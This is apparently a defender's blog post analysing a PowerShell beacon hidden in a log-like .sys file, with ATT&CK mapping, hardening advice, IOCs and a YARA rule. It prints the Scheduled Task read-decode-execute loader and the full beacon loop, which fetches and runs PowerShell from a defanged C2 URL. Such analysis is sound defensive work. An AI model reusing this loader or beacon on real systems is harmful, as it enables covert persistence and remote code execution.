---
title: "A driver that wasn't a driver: dissecting a steganographic PowerShell beacon"
date: 2026-05-23 09:00:00 +1000
categories: [Malware Analysis]
tags: [powershell, vbscript, scheduled-task, steganography, lolbin, c2, defense-evasion, application-control]
description: "A 3.7 MB log-line file in System32\\drivers\\, a tiny PowerShell read-decode-execute, and an HTTP beacon that pulls its capability live."
---
*The views and opinions expressed in this post are my own and do not represent those of my employer. This is a personal blog where I share research and things I'm learning.*

> **TL;DR**
>
> A campaign hides a 422-byte base64-encoded PowerShell beacon inside a 3.7 MB log-like file in `C:\Windows\System32\drivers\` with a `.sys` extension, read at a fixed offset by a Scheduled Task launching `wscript.exe`. The on-disk implant is intentionally tiny - the real capability is whatever the C2 (`counter[.]wmail-service[.]com`) pushes back every 2 seconds.
>
> **If this is your fleet, do these first:**
>
> - Turn on PowerShell Script Block Logging (Event ID 4104) - it captures the decoded body even when the loader is base64.
> - Apply Application Control (E8 strategy 1) to script hosts; force PowerShell into Constrained Language Mode where you can.
> - Hunt: file creation under `System32\drivers\` for any extension that isn't `.sys`, `.inf`, or `.cat`.
>
> Full IOC table near the bottom.
{: .prompt-tip }

## So this landed in my lap

A host got onboarded into our EDR fleet last week, and almost immediately the new agent flagged a Scheduled Task with a GUID for a name running `wscript.exe` against another GUID for a filename. That alone earns a second look. What pulled me in was the command line - buried in the arguments was a tidy little PowerShell one-liner that read 422 bytes from a file in `C:\Windows\System32\drivers\` named `...sys`, base64-decoded them, and ran the result as a script block.

Two things tipped me off straight away. First, the file in `drivers\` had a `.sys` extension but no business being a driver - Windows drivers don't get loaded by `wscript.exe`. Second, the loader was reading at a *hard-coded byte offset*. That's not how you read a config file. That's how you read a carrier.

So I pulled the file off the host, opened it on a triage VM, and went in. Here's what I found - and, more importantly, what I'd do about it if this turned up on one of your endpoints. Let's dig in.

## The attack at a glance

The whole chain, end to end:

1. **Persistence** - a Scheduled Task named `6B476D21-70A0-49AC-91C0-C72DB8007815` (yes, all GUIDs, no descriptive metadata) launches `wscript.exe` with the `/e:vbscript` flag.
2. **Script proxy execution** - the task points `wscript` at a GUID-named file in `C:\Windows\System32\<random folder>\` with no `.vbs` extension. The `/e:vbscript` flag forces VBScript interpretation regardless of what the file is called.
3. **Stage 1 - VBS wrapper** - that VBScript file spawns `powershell.exe` with a long inline `-Command` value (the wrapper itself wasn't on the box by the time I got there; I only had the command line).
4. **Stage 2 - read-decode-execute** - the PowerShell reads bytes 2153821..2154242 from a 3.7 MB file called `A32F0B95-...-C084069DF941.sys` in `C:\Windows\System32\drivers\`, base64-decodes them, and runs the result with `Invoke-Command` over a created `ScriptBlock`.
5. **Stage 3 - the beacon** - the decoded payload is a tiny polling loop that GETs `hxxp://counter[.]wmail-service[.]com/v1/<UUID>?v=DownloadsCounter_207` every 2 seconds and runs whatever PowerShell the server returns inside a `Start-Job`.

That's the whole on-disk implant. There is no second-stage binary sitting on the box. Whatever the implant actually *does* gets pushed down from C2, live, every two seconds.

## How it works

### Stage 1 - masquerade as a Windows driver

The 3.7 MB `.sys` file isn't a PE. `file` calls it "ISO-8859 text", and the first few hundred bytes look like this:

```text
08/23/2021 00:24:32.582 [8813]: Failed to load dependency Microsoft.AnalysisServices.AdomdClient
of assembly Microsoft.ReportingServices.DataExtensions, Version=2020.13.0.0, Culture=neutral,
PublicKeyToken=89845dcd8080cc91 because of the following error : Die gefundene Manifestdefinition
der Assembly stimmt nicht mit dem Assemblyverweis überein. (Ausnahme von HRESULT: 0x80131040)
```

That's a real SQL Server Reporting Services log line. The rest of the file is the same line repeated tens of thousands of times - same timestamp, just an incrementing thread ID in brackets. Whole-file entropy is **5.12** and printable-ASCII ratio is **99.7%**. To any static heuristic looking for "packed driver", this thing is invisible: not enough entropy to scream packer, not enough binary content to look like code, and a totally benign-sounding filename in a totally legitimate-looking directory.

A sliding 4 KB entropy window across the whole file flagged exactly **one** anomalous region. That region starts at byte **2,153,821** and runs **422 bytes**:

```text
d2hpbGUgKCR0cnVlKSB7DQogICAgdHJ5IHsNCiAgICAgICAgJHIgPSBJbnZva2UtUmVzdE1l
dGhvZCAtVXJpICdodHRwOi8vY291bnRlci53bWFpbC1zZXJ2aWNlLmNvbS92MS81QzA4RDM0
Qy04OEUxLTQzMzEtQTVBNy1GN0E3NDFFNEEyNzQ/dj1Eb3dubG9hZHNDb3VudGVyXzIwNycN
...
```

It's spliced into the log stream - the bytes immediately before are the tail of a log line, the bytes immediately after are the start of the next one. The carrier was clearly generated by a tool that pastes the payload in at a chosen offset and then writes the loader command line to match.

Honestly, that's a tidy bit of work on the attacker's part: an inert-looking text file that fails almost every "what's weird about this file" check, paired with a loader that knows exactly where the needle is in the haystack.

### Stage 2 - read at offset, base64-decode, execute as ScriptBlock

The Scheduled Task action - copy-pasted, just whitespaced for readability - is this:

```powershell
wscript.exe /e:vbscript /b
  "C:\Windows\System32\2g4fwI\CAA2997E-65EC-4498-AA36-381AFA7B94B8"
  "n; $sc  = [System.Text.Encoding]::UTF8.GetString(
              [System.IO.File]::ReadAllBytes(
                'C:\Windows\System32\drivers\tB2ZSTVM\A32F0B95-...-C084069DF941.sys'),
              2153821, 422);
      $sc2 = [Convert]::FromBase64String($sc);
      $sc3 = [System.Text.Encoding]::UTF8.GetString($sc2);
      Invoke-Command ([Scriptblock]::Create($sc3))"
```

A few details worth pulling out:

- **`/e:vbscript /b`** tells `wscript` to interpret the file as VBScript regardless of extension and run silently. So the on-disk wrapper can be called *anything* - here it's a GUID - and nothing about the filename gives away that it's script. This is a classic LOLBin move.
- **The `"n; ..."` prefix** on the PowerShell argument is the giveaway that the (missing) VBScript wrapper is concatenating a short stub onto the argument before handing it to `powershell.exe`. Something like `Begi` + `n; ...` -> `Begin; ...`, or `Fu` + `n; ...` -> `Fun; ...`. Either way, the prepended token ends up parsing as a benign identifier that PowerShell silently no-ops on, and the real work starts after the `;`. I couldn't confirm the exact prefix without the wrapper file.
- **`Invoke-Command ([Scriptblock]::Create(...))`** is an indirect execution pattern. The decoded script never lives in a `-Command` argument or on disk after decoding - it's a `ScriptBlock` object created and invoked in-process. That dodges anyone grepping command lines for the actual payload.

Decoded, the 422 bytes turn into 312 bytes of cleartext PowerShell.

### Stage 3 - the beacon

Here it is in full. No padding, no obfuscation past the base64:

```powershell
while ($true) {
    try {
        $r = Invoke-RestMethod -Uri 'hxxp://counter[.]wmail-service[.]com/v1/5C08D34C-88E1-4331-A5A7-F7A741E4A274?v=DownloadsCounter_207'
        if ($r -ne '') {
            Start-Job ([ScriptBlock]::Create($r)) | Wait-Job
        }
    }
    catch {}
    Start-Sleep 2
}
```

Three things to note. First, it's **HTTP, not HTTPS** - clear text, easy for a proxy to see. Second, every two seconds it phones home; that's an extremely chatty beacon and it'll be obvious in any half-decent egress telemetry. Third, the response body is executed *as PowerShell*, full stop. Whatever the operator pushes is what runs. The implant on disk is intentionally tiny and capability-free; the actual capability is whatever the server hands back at the moment of the poll.

The URL itself is a useful hunting pivot. The path takes the shape `/v1/<UUID>?v=DownloadsCounter_<NUM>`, and the UUID looks per-host or per-build. If you see one of these in your proxy logs, you can almost certainly find others in the same shape.

## Techniques observed (MITRE ATT&CK)

The following techniques have been mapped to MITRE ATT&CK for future reference.

| Tactic | Technique | ATT&CK ID | What it did here |
|--------|-----------|-----------|------------------|
| Persistence | Scheduled Task | T1053.005 | GUID-named task launching `wscript.exe`. |
| Execution | Visual Basic | T1059.005 | `wscript.exe /e:vbscript /b` against a GUID-named, extension-less file. |
| Execution | PowerShell | T1059.001 | Inline `-Command` doing read-decode-execute. |
| Defense Evasion | System Script Proxy Execution | T1216 | `wscript.exe` as the launcher for the real logic. |
| Defense Evasion | Masquerading: file type | T1036.008 | A text file named `.sys` in `C:\Windows\System32\drivers\`. |
| Defense Evasion | Obfuscated Files - Steganography | T1027.003 | Payload spliced into a log carrier at a fixed offset. |
| Defense Evasion | Encoded Data | T1027.013 | Base64 around the inner PowerShell. |
| Defense Evasion | Deobfuscate at Runtime | T1140 | `FromBase64String` + `Scriptblock::Create`. |
| Defense Evasion | Indirect Command Execution | T1202 | `Invoke-Command` over a runtime-created `ScriptBlock`. |
| C2 | Web Protocols | T1071.001 | Clear-text HTTP to `counter[.]wmail-service[.]com`. |
| C2 | Web Service | T1102.002 | Server pushes the next stage on each poll. |
| C2 | Ingress Tool Transfer | T1105 | Every poll can deliver new PowerShell. |

## Why this matters

The on-disk artefacts here look like nothing - a "log file", a "VBS file", a Scheduled Task with a UUID for a name. The implant's real capability isn't in any of those; it's whatever the operator decides to send back at the moment the beacon polls. That could be recon today and a full second-stage RAT tomorrow, on the same host, with no new files written.

Two practical consequences. One - if you only assess severity by what's locally observable, you'll underrate this. The locally observable bit is deliberately small. Two - whoever dropped these files into `C:\Windows\System32\drivers\` already had Administrator or SYSTEM on the host, because those folders are not user-writable. So even before you think about the beacon, you have an *already-privileged foothold* on that endpoint. Treat the box as compromised, not just "infected".

I'm not making any attribution claims here. The domain and the campaign tag are distinctive enough that someone with broader telemetry could probably cluster this with other incidents, but "who did it" is not what makes this useful to a defender. The chain itself is what to learn from.

## What defenders can do

| Technique (ATT&CK) | What to do | Essential Eight | What to hunt for |
|--------------------|------------|-----------------|------------------|
| PowerShell (T1059.001) | Constrained Language Mode; block `.ps1` from user paths; deny in-memory `[Convert]::FromBase64String -> Scriptblock::Create` patterns at the script level. | Application Control (L1+) | Script Block Logging - Event ID **4104** (catches the decoded body even if disk is obfuscated). |
| Visual Basic via wscript (T1059.005) | Disable Windows Script Host where it isn't needed; if you can't disable it, application-control `wscript.exe` so it can only run scripts from approved paths. | Application Control (L1+); User Application Hardening | Process creation (4688) for `wscript.exe` with `/e:vbscript`, especially against files with no `.vbs` / `.vbe` extension. |
| Scheduled Task persistence (T1053.005) | Restrict who can create tasks; alert on task creation that runs scripting hosts. | Application Control; Restrict Administrative Privileges | Event ID **4698** (task created) - bonus points if the task name is a bare GUID. |
| Masquerading + drivers folder (T1036.008) | Application control still blocks the *payload*, even if the carrier is named `.sys`. Tighten ACLs on `C:\Windows\System32\drivers\` - only privileged installers should be writing there. | Application Control; Restrict Administrative Privileges | File create events under `System32\drivers\` from anything that isn't a known installer; new GUID-named files under `System32\<random>\`. |
| HTTP C2 (T1071.001) | Default-deny egress; allow-list outbound destinations; DNS filtering on newly-registered / low-reputation domains; treat HTTP (not HTTPS) outbound as the loud anomaly it is. | No clean E8 home - this is network architecture and monitoring maturity. | Proxy logs for `*[.]wmail-service[.]com`; any URL matching `/v1/<UUID>?v=DownloadsCounter_*`; periodic ~2-second identical-shape GETs. |
| Indirect / fileless execution (T1202, T1140) | PowerShell Constrained Language Mode disables most of the .NET surface a loader like this needs (`System.IO.File`, `System.Text.Encoding`, `[Convert]`). Even L1 of Application Control bites here because the *script content* is what's restricted. | Application Control (L1+) | Script Block Logging (4104) - Constrained Language Mode breakage shows up here too. |

### Constrain PowerShell, properly

This whole chain falls apart if PowerShell can't reach the .NET types it needs. Constrained Language Mode (`$ExecutionContext.SessionState.LanguageMode`) takes `System.IO.File`, `System.Text.Encoding`, `System.Convert`, and `[Scriptblock]::Create` off the table for anything other than signed/trusted scripts. That's the single highest-value control here. It maps to **Application Control** (Essential Eight strategy 1) - *Hardening Microsoft Windows Workstations* has the PowerShell section, and *Implementing Application Control* covers how to wire it up so scripts in user-writable paths can't run at all. Detection safety-net: **Script Block Logging (Event ID 4104)** records the *decoded* body, so even a base64-hidden loader leaves a clean record. If you have nothing else, turn this on across the fleet today.

### Tame the script hosts

`wscript.exe /e:vbscript /b` is the launcher this campaign chose, and it's not the only one that uses it. If your environment doesn't need WSH (most don't, outside specific admin scripts), disable it via the registry value `Enabled` under `HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings`. If you can't disable it, app-control `wscript.exe` and `cscript.exe` so they can only execute scripts from specified, trusted paths. **Essential Eight: Application Control + User Application Hardening.** Hunt for **Event ID 4688** with `wscript.exe` + `/e:vbscript`, and especially when the script argument has no `.vbs` / `.vbe` extension - that combination is almost always interesting.

### Watch the drivers folder

The carrier hides in `C:\Windows\System32\drivers\`, which is normally only written to by signed installers, Windows Update, and drivers being staged. Anything that writes a non-driver text or script file into that path is by definition off-baseline. A simple file-audit rule that fires on **non-.sys/.inf/.cat creates** under `drivers\` would catch this campaign on Day Zero. **Essential Eight: Restrict Administrative Privileges.** *Restricting Administrative Privileges* is the hardening reference: whoever can write into that folder is, by definition, privileged on the host.

### Block egress you didn't approve

You won't be able to prevent every kind of HTTP beacon, but you can get most of them. Default-deny outbound from servers (they almost never legitimately initiate connections to the internet), and on workstations route everything through a proxy with category and reputation enforcement. A two-second poll to a low-reputation host on **clear-text HTTP** is one of the easiest possible C2 patterns to see in proxy logs once you're actually looking. **No clean Essential Eight tie-in here** - egress filtering doesn't sit under any single strategy, which is worth being honest about; this is general gateway and monitoring maturity. Hunt periodic, identical-shape requests to recently-resolved domains, and any URL matching `/v1/<UUID>?v=DownloadsCounter_*`.

### And - back up like you mean it

This sample didn't encrypt anything, but with operator-pushed PowerShell on every poll, the gap between "beacon" and "encryptor" is one HTTP response. **Essential Eight strategy 8: Regular Backups** - tested, retained, and stored where an attacker with local admin can't reach them. Recovery doesn't prevent the attack, but it changes what "worst case" means.

## Hunting and detection summary

Things to actually go and check:

- **Event ID 4104** (PowerShell Script Block Logging) for command bodies containing `System.IO.File]::ReadAllBytes` together with `Convert]::FromBase64String` and `Scriptblock]::Create`. That's the read-decode-execute fingerprint.
- **Event ID 4688** for `wscript.exe` with `/e:vbscript`, especially when the script path has no `.vbs` / `.vbe` extension or is a bare GUID.
- **Event ID 4698** for newly-created Scheduled Tasks whose name is a bare GUID and whose action runs `wscript.exe`.
- File creation under `C:\Windows\System32\drivers\` where the file is **not** `.sys`, `.inf`, or `.cat`, especially under a freshly-created `drivers\<random>\` subdirectory.
- Proxy logs for `*[.]wmail-service[.]com`, for any URL path matching `/v1/<UUID>?v=DownloadsCounter_*`, and for periodic ~2-second identical-shape HTTP requests to recently-resolved external hosts.
- Files in `System32\drivers\` whose body contains the SSRS "Failed to load dependency Microsoft.AnalysisServices.AdomdClient" line repeated more than 100 times - that string body never legitimately lives in a driver.

## Indicators of Compromise

| Type | Indicator | Notes |
|------|-----------|-------|
| SHA-256 | `e780a5c6284d89bb35d506ee31fcad09435a34838c4844acf87ba26124aaa538` | Steganographic carrier (`A32F0B95-...-C084069DF941.sys`). Per-host carriers may differ - the *shape* matters more than the hash. |
| MD5 | `bb6ffce0798a810401144058d4acb128` | Same file. |
| Domain | `counter[.]wmail-service[.]com` | Stage-3 C2. |
| Domain (apex) | `wmail-service[.]com` | Block apex and all subdomains. |
| URL pattern | `hxxp://counter[.]wmail-service[.]com/v1/<UUID>?v=DownloadsCounter_<NUM>` | Likely campaign template. |
| URL (observed) | `hxxp://counter[.]wmail-service[.]com/v1/5C08D34C-88E1-4331-A5A7-F7A741E4A274?v=DownloadsCounter_207` | The hard-coded beacon URL in this sample. |
| File path | `C:\Windows\System32\drivers\tB2ZSTVM\A32F0B95-...-C084069DF941.sys` | Carrier on host. |
| File path | `C:\Windows\System32\2g4fwI\CAA2997E-65EC-4498-AA36-381AFA7B94B8` | VBS wrapper (no extension). |
| Path pattern | `C:\Windows\System32\<6-8 random alnum>\<GUID, no extension>` | Hunt this directory shape. |
| Scheduled Task | `6B476D21-70A0-49AC-91C0-C72DB8007815` | GUID-named task running `wscript.exe`. |
| String | `Failed to load dependency Microsoft.AnalysisServices.AdomdClient ... 0x80131040` | The repeated SSRS log line that fills the carrier. |

## Detection rules

A YARA rule for the carrier - matches both the on-disk filler shape and the decoded beacon, so it works whether you're looking at the carrier or at the cleartext stage after decode.

```yara
rule WMail_Service_Steganographic_Carrier
{
    meta:
        author      = "Luke Wilkinson"
        date        = "2026-05-23"
        description = "Carrier file (often .sys, lives in System32\\drivers\\<rand>\\) padded with repeated SSRS log lines and a Base64 PowerShell beacon for counter[.]wmail-service[.]com hidden at a fixed offset."
        sha256      = "e780a5c6284d89bb35d506ee31fcad09435a34838c4844acf87ba26124aaa538"
        severity    = "high"

    strings:
        $filler1 = "Failed to load dependency Microsoft.AnalysisServices.AdomdClient of assembly Microsoft.ReportingServices.DataExtensions"
        $filler2 = "Die gefundene Manifestdefinition der Assembly stimmt nicht mit dem Assemblyverweis"
        $filler3 = "0x80131040"

        // base64 substrings of stable parts of the decoded loop
        $b64_uri   = "aHR0cDovL2NvdW50ZXIud21haWwtc2VydmljZS5jb20"     // hxxp://counter[.]wmail-service[.]com
        $b64_block = "U2NyaXB0QmxvY2tdOjpDcmVhdGUo"                     // ScriptBlock]::Create(
        $b64_job   = "U3RhcnQtSm9i"                                    // Start-Job

        // cleartext fallback if the decoded stage hits disk
        $ct_uri  = "counter.wmail-service.com"
        $ct_tag  = "DownloadsCounter_"
        $ct_loop = "[ScriptBlock]::Create($r)" ascii

    condition:
        (2 of ($filler*) and 1 of ($b64_*))
        or (2 of ($ct_*))
}
```

## Closing

What I liked about this one is how *quiet* the on-disk side is. Almost everything that makes a static engine pick a file out of a crowd - high entropy, suspicious strings, weird sections, mismatched headers - is gone. The whole implant is a Scheduled Task, a script file with no extension, and a log file with one anomalous slice. It's a good reminder that "looks normal" is not the same as "is normal", and that the controls that hold up best - Constrained Language Mode, application control on script hosts, default-deny egress, audit on `drivers\` - don't care how clever the disguise is.

If you take one thing away: turn on **Script Block Logging** if you haven't already. Whatever fancy steganography someone wraps a PowerShell loader in, by the time it actually runs, **4104** sees the cleartext.

Stay curious.

---

*This post was written with AI assistance for structuring and editing. The analysis is mine, and so are any errors - if you spot something off, ping me on [X](https://twitter.com/btcoolteam) or [Instagram](https://instagram.com/blueteamcoolteam).*
## References

- MITRE ATT&CK technique pages: T1053.005, T1059.001, T1059.005, T1216, T1036.008, T1027.003, T1027.013, T1140, T1202, T1071.001, T1102.002, T1105
- ASD/ACSC: *Hardening Microsoft Windows 10/11 Workstations* (PowerShell section), *Implementing Application Control*, *Restricting Administrative Privileges*, *Essential Eight Maturity Model*
